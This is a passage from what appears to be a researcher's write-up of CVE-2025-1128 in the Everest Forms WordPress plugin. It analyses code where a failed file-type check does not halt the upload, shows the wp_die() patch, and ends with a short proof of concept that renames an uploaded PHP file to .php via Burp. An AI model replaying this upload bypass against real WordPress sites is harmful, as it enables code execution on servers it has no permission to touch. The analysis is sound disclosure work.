$form_data, $meta_key ) {&#xA;    ...&#xA;    $wp_filetype = wp_check_filetype_and_ext( $file[&amp;#39;tmp_path&amp;#39;], $file[&amp;#39;name&amp;#39;] );&#xA;    $ext             = empty( $wp_filetype[&amp;#39;ext&amp;#39;] ) ? &amp;#39;&amp;#39; : $wp_filetype[&amp;#39;ext&amp;#39;];&#xA;    $type            = empty( $wp_filetype[&amp;#39;type&amp;#39;] ) ? &amp;#39;&amp;#39; : $wp_filetype[&amp;#39;type&amp;#39;];&#xA;    $proper_filename = empty( $wp_filetype[&amp;#39;proper_filename&amp;#39;] ) ? &amp;#39;&amp;#39; : $wp_filetype[&amp;#39;proper_filename&amp;#39;];&#xA;    if ( $proper_filename || ! $ext || ! $type ) {&#xA;        evf()-&amp;gt;task-&amp;gt;errors[ $form_data[&amp;#39;id&amp;#39;] ][ $field_id ] = esc_html__( &amp;#39;File type is not allowed.&amp;#39;, &amp;#39;everest-forms&amp;#39; );&#xA;        update_option( &amp;#39;evf_validation_error&amp;#39;, &amp;#39;yes&amp;#39; );&#xA;    }&#xA;    ...&#xA;    // upload file handler&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;code&gt;wp_check_filetype_and_ext()&lt;/code&gt; function will return empty values for &lt;code&gt;$ext&lt;/code&gt; and &lt;code&gt;$type&lt;/code&gt; if the uploaded file is invalid (not in WordPress’s whitelist of allowed types: &lt;a href=&#34;https://developer.wordpress.org/reference/functions/wp_get_mime_types/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://developer.wordpress.org/reference/functions/wp_get_mime_types/&lt;/a&gt;).&lt;/p&gt;&#xA;&lt;p&gt;After lines 8-9 run, there is no mechanism to stop execution, so the upload logic continues.&lt;/p&gt;&#xA;&lt;p&gt;The patch fixes this by calling &lt;a href=&#34;https://developer.wordpress.org/reference/functions/wp_die/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;wp_die()&lt;/a&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function format( $field_id, $field_submit, $form_data, $meta_key ) {&#xA;    ...&#xA;    $wp_filetype = wp_check_filetype_and_ext( $file[&amp;#39;tmp_path&amp;#39;], $file[&amp;#39;name&amp;#39;] );&#xA;    $ext             = empty( $wp_filetype[&amp;#39;ext&amp;#39;] ) ? &amp;#39;&amp;#39; : $wp_filetype[&amp;#39;ext&amp;#39;];&#xA;    $type            = empty( $wp_filetype[&amp;#39;type&amp;#39;] ) ? &amp;#39;&amp;#39; : $wp_filetype[&amp;#39;type&amp;#39;];&#xA;    $proper_filename = empty( $wp_filetype[&amp;#39;proper_filename&amp;#39;] ) ? &amp;#39;&amp;#39; : $wp_filetype[&amp;#39;proper_filename&amp;#39;];&#xA;    if ( $proper_filename || ! $ext || ! $type ) {&#xA;        evf()-&amp;gt;task-&amp;gt;errors[ $form_data[&amp;#39;id&amp;#39;] ][ $field_id ] = esc_html__( &amp;#39;File type is not allowed.&amp;#39;, &amp;#39;everest-forms&amp;#39; );&#xA;        update_option( &amp;#39;evf_validation_error&amp;#39;, &amp;#39;yes&amp;#39; );&#xA;        wp_die( &amp;#39;File type is not allowed&amp;#39; );&#xA;    }&#xA;    ...&#xA;    // upload file handler&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;code-analysis&#34;&gt;&lt;span&gt;Code Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#code-analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;public function format( $field_id, $field_submit, $form_data, $meta_key ) {&#xA;    // Setup class properties to reuse everywhere.&#xA;    $this-&amp;gt;form_data  = (array) $form_data;&#xA;    $this-&amp;gt;form_id    = absint( $this-&amp;gt;form_data[&amp;#39;id&amp;#39;] );&#xA;    $this-&amp;gt;field_id   = $field_id;&#xA;    $this-&amp;gt;field_data = $this-&amp;gt;form_data[&amp;#39;form_fields&amp;#39;][ $this-&amp;gt;field_id ];&#xA;&#xA;    $field_label = ! empty( $this-&amp;gt;form_data[&amp;#39;form_fields&amp;#39;][ $this-&amp;gt;field_id ][&amp;#39;label&amp;#39;] ) ? $this-&amp;gt;form_data[&amp;#39;form_fields&amp;#39;][ $this-&amp;gt;field_id ][&amp;#39;label&amp;#39;] : &amp;#39;&amp;#39;;&#xA;    $input_name  = sprintf( &amp;#39;everest_forms_%d_%s&amp;#39;, $this-&amp;gt;form_id, $this-&amp;gt;field_id );&#xA;    // Make sure json_decode() doesn&amp;#39;t fail on newer PHP.&#xA;    try {&#xA;        $raw_files = json_decode( wp_unslash( $_POST[ $input_name ] ), true ); // phpcs:ignore WordPress.Security&#xA;    } catch ( Exception $e ) {&#xA;        evf()-&amp;gt;task-&amp;gt;form_fields[ $this-&amp;gt;field_id ] = $processed;&#xA;        return;&#xA;    }&#xA;&#xA;    // Make sure we process only submitted files with the expected structure and keys.&#xA;    $files = array_filter(&#xA;        $raw_files,&#xA;        static function ( $file ) {&#xA;            return ( is_array( $file ) || is_object( $file ) &amp;amp;&amp;amp; count( $file ) === 2 ) &amp;amp;&amp;amp; ! empty( $file[&amp;#39;file&amp;#39;] ) &amp;amp;&amp;amp; ! empty( $file[&amp;#39;name&amp;#39;] );&#xA;        }&#xA;    );&#xA;&#xA;    if ( empty( $files ) ) {&#xA;        evf()-&amp;gt;task-&amp;gt;form_fields[ $this-&amp;gt;field_id ] = $processed;&#xA;        return;&#xA;    }&#xA;&#xA;    $data = array();&#xA;&#xA;    foreach ( $files as $file ) {&#xA;        $file = $this-&amp;gt;generate_file_info( $file );&#xA;&#xA;        $wp_filetype = wp_check_filetype_and_ext( $file[&amp;#39;tmp_path&amp;#39;], $file[&amp;#39;name&amp;#39;] );&#xA;&#xA;        $ext             = empty( $wp_filetype[&amp;#39;ext&amp;#39;] ) ? &amp;#39;&amp;#39; : $wp_filetype[&amp;#39;ext&amp;#39;];&#xA;        $type            = empty( $wp_filetype[&amp;#39;type&amp;#39;] ) ? &amp;#39;&amp;#39; : $wp_filetype[&amp;#39;type&amp;#39;];&#xA;        $proper_filename = empty( $wp_filetype[&amp;#39;proper_filename&amp;#39;] ) ? &amp;#39;&amp;#39; : $wp_filetype[&amp;#39;proper_filename&amp;#39;];&#xA;&#xA;        if ( $proper_filename || ! $ext || ! $type ) {&#xA;            evf()-&amp;gt;task-&amp;gt;errors[ $form_data[&amp;#39;id&amp;#39;] ][ $field_id ] = esc_html__( &amp;#39;File type is not allowed.&amp;#39;, &amp;#39;everest-forms&amp;#39; );&#xA;            update_option( &amp;#39;evf_validation_error&amp;#39;, &amp;#39;yes&amp;#39; );&#xA;        }&#xA;&#xA;        // Allow third-party integrations.&#xA;        if ( has_filter( &amp;#39;everest_forms_integration_uploads&amp;#39; ) ) {&#xA;            $file = apply_filters( &amp;#39;everest_forms_integration_uploads&amp;#39;, $file, $this-&amp;gt;form_data );&#xA;        }&#xA;&#xA;        if ( $this-&amp;gt;is_media_integrated() ) {&#xA;            $file[&amp;#39;path&amp;#39;] = $file[&amp;#39;tmp_path&amp;#39;];&#xA;&#xA;            $file = $this-&amp;gt;generate_file_attachment( $file );&#xA;        } elseif (&#xA;                ! isset( $file[&amp;#39;external&amp;#39;] )&#xA;                &amp;amp;&amp;amp; file_exists( $file[&amp;#39;tmp_path&amp;#39;] )&#xA;            ) {&#xA;&#xA;                $this-&amp;gt;create_dir( dirname( $file[&amp;#39;path&amp;#39;] ) );&#xA;                @rename( $file[&amp;#39;tmp_path&amp;#39;] , $file[&amp;#39;path&amp;#39;] ); // phpcs:ignore WordPress.PHP.NoSilencedErrors.Discouraged&#xA;                $this-&amp;gt;set_file_fs_permissions( $file[&amp;#39;path&amp;#39;] );&#xA;        }&#xA;&#xA;        $data[] = $this-&amp;gt;generate_file_data( $file );&#xA;    }&#xA;    ...&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This plugin is intended to create form templates and use them in posts/pages. Because the vulnerability concerns &lt;strong&gt;file upload&lt;/strong&gt;, we create a form with a &lt;strong&gt;File Upload&lt;/strong&gt; field and embed it into a post.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-09-cve-2025-1128/create_form.png&#34; title=&#34;Create a form with a **File Upload** field&#34; data-thumbnail=&#34;/posts/2025-11-09-cve-2025-1128/create_form.png&#34; data-sub-html=&#34;&lt;h2&gt;Create Form&lt;/h2&gt;&lt;p&gt;Create a form with a **File Upload** field&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-09-cve-2025-1128/create_form.png&#39; alt=&#34;Create Form&#34; height=&#34;552&#34; width=&#34;1302&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Create a form with a **File Upload** field&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Upload any file and intercept it with BurpSuite (uploads are allowed for anonymous users when accessing the post/page that contains the form).&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-09-cve-2025-1128/snap_request.png&#34; title=&#34;Intercept file upload request with BurpSuite&#34; data-thumbnail=&#34;/posts/2025-11-09-cve-2025-1128/snap_request.png&#34; data-sub-html=&#34;&lt;h2&gt;Snap Request&lt;/h2&gt;&lt;p&gt;Intercept file upload request with BurpSuite&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-09-cve-2025-1128/snap_request.png&#39; alt=&#34;Snap Request&#34; height=&#34;793&#34; width=&#34;794&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Intercept file upload request with BurpSuite&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Set a breakpoint at the &lt;code&gt;format()&lt;/code&gt; method and observe.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-09-cve-2025-1128/input_name.png&#34; title=&#34;$input_name in debugger&#34; data-thumbnail=&#34;/posts/2025-11-09-cve-2025-1128/input_name.png&#34; data-sub-html=&#34;&lt;h2&gt;Input Name&lt;/h2&gt;&lt;p&gt;$input_name in debugger&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-09-cve-2025-1128/input_name.png&#39; alt=&#34;Input Name&#34; height=&#34;403&#34; width=&#34;1090&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;$input_name in debugger&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;From debugging, &lt;code&gt;$input_name&lt;/code&gt; maps to the array containing JSON data fields &lt;code&gt;file&lt;/code&gt; and &lt;code&gt;name&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;The data is JSON-decoded and assigned to &lt;code&gt;$raw_files&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;try {&#xA;    $raw_files = json_decode( wp_unslash( $_POST[ $input_name ] ), true ); // phpcs:ignore WordPress.Security&#xA;} catch ( Exception $e ) {&#xA;    evf()-&amp;gt;task-&amp;gt;form_fields[ $this-&amp;gt;field_id ] = $processed;&#xA;    return;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-09-cve-2025-1128/raw_files.png&#34; title=&#34;$raw_files in debugger&#34; data-thumbnail=&#34;/posts/2025-11-09-cve-2025-1128/raw_files.png&#34; data-sub-html=&#34;&lt;h2&gt;Raw Files&lt;/h2&gt;&lt;p&gt;$raw_files in debugger&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-09-cve-2025-1128/raw_files.png&#39; alt=&#34;Raw Files&#34; height=&#34;372&#34; width=&#34;1224&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;$raw_files in debugger&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$files = array_filter(&#xA;    $raw_files,&#xA;    static function ( $file ) {&#xA;        return ( is_array( $file ) || is_object( $file ) &amp;amp;&amp;amp; count( $file ) === 2 ) &amp;amp;&amp;amp; ! empty( $file[&amp;#39;file&amp;#39;] ) &amp;amp;&amp;amp; ! empty( $file[&amp;#39;name&amp;#39;] );&#xA;    }&#xA;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This filter returns the data assigned to &lt;code&gt;$files&lt;/code&gt;, ensuring only submitted files with the expected structure and keys are processed; otherwise it returns empty.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-09-cve-2025-1128/files.png&#34; title=&#34;$files in debugger&#34; data-thumbnail=&#34;/posts/2025-11-09-cve-2025-1128/files.png&#34; data-sub-html=&#34;&lt;h2&gt;Files&lt;/h2&gt;&lt;p&gt;$files in debugger&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-09-cve-2025-1128/files.png&#39; alt=&#34;Files&#34; height=&#34;365&#34; width=&#34;657&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;$files in debugger&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Iterating the &lt;code&gt;$files&lt;/code&gt; array, the plugin calls &lt;code&gt;generate_file_info()&lt;/code&gt; to create temporary information for each file, then checks the file type using &lt;code&gt;wp_check_filetype_and_ext()&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;foreach ( $files as $file ) {&#xA;    $file = $this-&amp;gt;generate_file_info( $file );&#xA;    $wp_filetype = wp_check_filetype_and_ext( $file[&amp;#39;tmp_path&amp;#39;], $file[&amp;#39;name&amp;#39;] );&#xA;    ...&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;protected function generate_file_info( $file ) {&#xA;    $dir = $this-&amp;gt;get_form_files_dir();&#xA;    $file[&amp;#39;tmp_path&amp;#39;] = trailingslashit( $this-&amp;gt;get_tmp_dir() ) . sanitize_file_name($file[&amp;#39;file&amp;#39;]);&#xA;    $file[&amp;#39;type&amp;#39;]     = &amp;#39;application/octet-stream&amp;#39;;&#xA;    if ( is_file( $file[&amp;#39;tmp_path&amp;#39;] ) ) {&#xA;        $filetype     = wp_check_filetype( $file[&amp;#39;tmp_path&amp;#39;] );&#xA;        $file[&amp;#39;type&amp;#39;] = $filetype[&amp;#39;type&amp;#39;];&#xA;    }&#xA;&#xA;    // Data for no media case.&#xA;    $file_ext              = pathinfo( $file[&amp;#39;name&amp;#39;], PATHINFO_EXTENSION );&#xA;    $file_base             = wp_basename( $file[&amp;#39;name&amp;#39;], &amp;#34;.$file_ext&amp;#34; );&#xA;    $file[&amp;#39;file_name_new&amp;#39;] = sprintf( &amp;#39;%s-%s.%s&amp;#39;, $file_base, wp_hash( $dir[&amp;#39;path&amp;#39;] . $this-&amp;gt;form_data[&amp;#39;id&amp;#39;] . $this-&amp;gt;field_id ), strtolower( $file_ext ) );&#xA;    $file[&amp;#39;file_name_new&amp;#39;] = wp_unique_filename( trailingslashit( $dir[&amp;#39;path&amp;#39;] ), sanitize_file_name( $file[&amp;#39;file_name_new&amp;#39;] ) );&#xA;    $file[&amp;#39;file_url&amp;#39;]      = trailingslashit( $dir[&amp;#39;url&amp;#39;] ) . $file[&amp;#39;file_name_new&amp;#39;];&#xA;    $file[&amp;#39;path&amp;#39;]          = trailingslashit( $dir[&amp;#39;path&amp;#39;] ) . $file[&amp;#39;file_name_new&amp;#39;];&#xA;    $file[&amp;#39;attachment_id&amp;#39;] = 0;&#xA;&#xA;    return $file;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Note that the function uses &lt;code&gt;wp_hash()&lt;/code&gt; to generate &lt;code&gt;$file[&#39;file_name_new&#39;]&lt;/code&gt; and then concatenates it into &lt;code&gt;$dir[&#39;path&#39;]&lt;/code&gt; to set &lt;code&gt;$file[&#39;path&#39;]&lt;/code&gt;; this value is created using a salt configured in &lt;code&gt;wp-config.php&lt;/code&gt; — so we only know that a salt exists.&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition info open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-circle-info&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Info&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;&lt;code&gt;$file_ext&lt;/code&gt; is concatenated at the end of &lt;code&gt;file[&#39;path&#39;]&lt;/code&gt;, and we can control it through the &lt;code&gt;name&lt;/code&gt; field supplied in the request.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;- _690888869ea291.55135482.txt&#xA;&amp;#43; _690888869ea291.55135482.php&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-09-cve-2025-1128/file.png&#34; title=&#34;$file in debugger&#34; data-thumbnail=&#34;/posts/2025-11-09-cve-2025-1128/file.png&#34; data-sub-html=&#34;&lt;h2&gt;File&lt;/h2&gt;&lt;p&gt;$file in debugger&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-09-cve-2025-1128/file.png&#39; alt=&#34;File&#34; height=&#34;709&#34; width=&#34;1862&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;$file in debugger&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Here we only need to pay attention to three fields: &lt;code&gt;tmp_path&lt;/code&gt;, &lt;code&gt;name&lt;/code&gt;, &lt;code&gt;path&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;tmp_path&lt;/code&gt; and &lt;code&gt;name&lt;/code&gt; are passed as arguments to &lt;code&gt;wp_check_filetype_and_ext()&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;tmp_path&lt;/code&gt; and &lt;code&gt;path&lt;/code&gt; are used as arguments to &lt;code&gt;rename()&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;As analyzed earlier, the logic continues running even when the uploaded file is not allowed. &lt;code&gt;rename($file[&#39;tmp_path&#39;], $file[&#39;path&#39;])&lt;/code&gt; is called to move the file from the temporary path to the final path.&lt;/p&gt;&#xA;&lt;hr&gt;&#xA;&lt;p&gt;The &lt;code&gt;format()&lt;/code&gt; method is registered as a callback for an action hook:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action( &amp;#39;everest_forms_process_format_&amp;#39; . $this-&amp;gt;type, array( $this, &amp;#39;format&amp;#39; ), 10, 4 );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;When the type is &lt;code&gt;file-upload&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-09-cve-2025-1128/type.png&#34; title=&#34;Type required to call format&#34; data-thumbnail=&#34;/posts/2025-11-09-cve-2025-1128/type.png&#34; data-sub-html=&#34;&lt;h2&gt;Type&lt;/h2&gt;&lt;p&gt;Type required to call format&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-09-cve-2025-1128/type.png&#39; alt=&#34;Type&#34; height=&#34;415&#34; width=&#34;1729&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Type required to call format&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Searching for the keyword &lt;code&gt;everest_forms_process_format_&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-09-cve-2025-1128/action.png&#34; title=&#34;Hook everest_forms_process_format_file-upload is invoked&#34; data-thumbnail=&#34;/posts/2025-11-09-cve-2025-1128/action.png&#34; data-sub-html=&#34;&lt;h2&gt;Action&lt;/h2&gt;&lt;p&gt;Hook everest_forms_process_format_file-upload is invoked&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-09-cve-2025-1128/action.png&#39; alt=&#34;Action&#34; height=&#34;351&#34; width=&#34;1771&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Hook everest_forms_process_format_file-upload is invoked&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;This hook is called in &lt;code&gt;do_task()&lt;/code&gt; via &lt;code&gt;do_action()&lt;/code&gt; with the dynamic &lt;code&gt;$field_type&lt;/code&gt; argument:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function listen_task() {&#xA;    ...&#xA;    if ( ! empty( $_POST[&amp;#39;everest_forms&amp;#39;][&amp;#39;id&amp;#39;] ) ) { // phpcs:ignore WordPress.Security.NonceVerification&#xA;        $this-&amp;gt;do_task( evf_sanitize_entry( wp_unslash( $_POST[&amp;#39;everest_forms&amp;#39;] ) ) ); // phpcs:ignore WordPress.Security.NonceVerification, WordPress.Security.ValidatedSanitizedInput.InputNotSanitized&#xA;    }&#xA;    ...&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;do_task()&lt;/code&gt; is called from &lt;code&gt;listen_task()&lt;/code&gt; when an Everest Forms &lt;code&gt;id&lt;/code&gt; is provided in the POST request.&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;listen_task()&lt;/code&gt; is registered as a callback for the &lt;code&gt;wp&lt;/code&gt; action hook:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action( &amp;#39;wp&amp;#39;, array( $this, &amp;#39;listen_task&amp;#39; ) );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This hook runs on every request.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;A[&amp;#34;User submits form (file)&amp;#34;] --&amp;gt; B[&amp;#34;Browser sends POST to page with form&amp;#34;]&#xA;B --&amp;gt; C[&amp;#34;WP hook triggered - listen_task()&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;do_task() calls do_action() with field type&amp;#34;]&#xA;D --&amp;gt; E[&amp;#34;everest_forms_process_format_file-upload calls format()&amp;#34;]&#xA;E --&amp;gt; F[&amp;#34;generate_file_info() creates tmp_path, name, path&amp;#34;]&#xA;E --&amp;gt; G[&amp;#34;wp_check_filetype_and_ext(tmp_path, name)&amp;#34;]&#xA;G --&amp;gt; H{&amp;#34;File type check result&amp;#34;}&#xA;H --&amp;gt;|Valid| I[&amp;#34;rename(tmp_path → path) moves file to uploads&amp;#34;]&#xA;H --&amp;gt;|Invalid| J[&amp;#34;Set error but continue execution&amp;#34;]&#xA;J --&amp;gt; I&#xA;I --&amp;gt; K[&amp;#34;File accessible in uploads → potential executable upload&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Create a &lt;code&gt;.txt&lt;/code&gt; file that contains PHP code:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;TEXT&#xA;&amp;lt;?php phpinfo();?&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Enable Burp Intercept and capture the file upload request.&lt;/li&gt;&#xA;&lt;li&gt;Modify the &lt;code&gt;name&lt;/code&gt; field in the intercepted request to use the &lt;code&gt;.php&lt;/code&gt; extension and forward the request.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-09-cve-2025-1128/fileuploaded.png&#34; title=&#34;File uploaded successfully&#34; data-thumbnail=&#34;/posts/2025-11-09-cve-2025-1128/fileuploaded.png&#34; data-sub-html=&#34;&lt;h2&gt;File Uploaded&lt;/h2&gt;&lt;p&gt;File uploaded successfully&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-09-cve-2025-1128/fileuploaded.png&#39; alt=&#34;File Uploaded&#34; height=&#34;351&#34; width=&#34;1771&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;File uploaded successfully&lt;/figcaption&gt;&#xA;  